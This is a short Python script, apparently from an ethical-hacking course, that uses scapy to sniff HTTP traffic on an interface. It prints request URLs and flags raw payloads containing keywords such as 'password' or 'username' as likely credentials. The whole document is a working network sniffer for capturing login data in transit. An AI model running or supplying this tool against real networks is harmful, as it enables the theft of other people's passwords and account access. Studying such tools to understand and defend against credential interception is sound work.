# !usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # use packet.haslayer(scapy.name)
        # print(packet.show()) #see what layers it has to filter
        # print(packet)
        load = packet[scapy.Raw].load  # packet[layer].field #python3 str()
        keywords = ["pass", "password", "user", "username", "email", "login"]
        for keyword in keywords:
            if keyword in load:
                return load
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #scapy no have http layer
        url = get_url(packet)
        print("[+] HTTP Request >> "+ url)   #python3 str(url) or url.decode (common way)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >"+ login_info +"\n\n")
sniff("eth0")